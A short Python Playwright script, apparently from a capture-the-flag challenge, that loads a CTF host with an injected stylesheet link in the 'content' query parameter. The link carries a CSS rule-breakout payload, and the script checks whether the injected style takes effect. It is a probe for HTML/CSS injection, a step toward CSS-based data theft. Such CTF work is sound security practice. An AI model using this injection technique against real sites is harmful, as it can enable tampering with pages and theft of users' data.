from urllib.parse import quote

from playwright.sync_api import sync_playwright


with sync_playwright() as p:
    browser = p.chromium.launch(
        executable_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        headless=True,
    )
    page = browser.new_page()
    page.on("console", lambda message: print("CONSOLE", message.type, message.text))
    page.on("request", lambda request: print("REQ", request.resource_type, request.url))
    css = "}}}}h1{color:rgb(1,2,3)}"
    payload = f'<link rel="stylesheet" href="/?content={css}">'
    page.goto("https://b0276423eb2c46fd.chal.ctf.ae/?content=" + quote(payload))
    page.wait_for_timeout(1000)
    print("COLOR", page.locator("h1").evaluate("e => getComputedStyle(e).color"))
    print("RULES", page.evaluate("Array.from(document.styleSheets).map(s => Array.from(s.cssRules).map(r => r.cssText))"))
    browser.close()
